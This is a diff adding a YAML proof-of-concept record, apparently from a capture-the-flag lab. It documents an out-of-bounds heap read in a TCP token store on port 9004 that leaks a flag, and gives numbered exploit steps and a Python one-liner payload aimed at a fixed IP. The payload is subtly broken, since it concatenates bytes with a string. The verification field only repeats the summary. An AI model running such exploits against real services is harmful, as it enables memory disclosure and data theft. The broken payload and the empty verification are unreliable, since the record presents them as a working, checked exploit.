@@ -1,0 +1,28 @@
+info:
+  name: token_store_oob_read_null_terminator
+  cve: ''
+  summary: TCP line-protocol token store has fixed-size 64B buffer without guaranteed
+    null termination; storing exactly 64+ chars makes strlen() read past buffer into
+    adjacent heap, leaking flag from neighboring memory during LIST/CHECK operations.
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: TCP line-protocol token store has fixed-size 64B buffer without guaranteed
+    null termination; storing exactly 64+ chars makes strlen() read past buffer into
+    adjacent heap, leaking flag from neighboring memory during LIST/CHECK operations.
+  steps:
+  - 1. Connect to TCP port 9004 on target host
+  - 2. Store a token of exactly 64 bytes (e.g., 'STORE ' + 'A'*64)
+  - 3. Issue LIST command
+  - 4. Parse [LAST] line - it will contain 64 A's + leaked heap memory including the
+    flag
+  - 5. Extract flag pattern from the leaked data
+  payload: python3 -c "import socket,time; s=socket.socket(); s.connect(('10.0.175.80',9004));
+    time.sleep(0.3); s.recv(4096); s.sendall(b'STORE '+'A'*64+b'\n'); time.sleep(0.3);
+    s.sendall(b'LIST\n'); time.sleep(0.5); print(s.recv(8192).decode('latin1'))" |
+    grep -oP 'flag\{[^}]+\}'
+  verification: TCP line-protocol token store has fixed-size 64B buffer without guaranteed
+    null termination; storing exactly 64+ chars makes strlen() read past buffer into
+    adjacent heap, leaking flag from neighboring memory during LIST/CHECK operations.
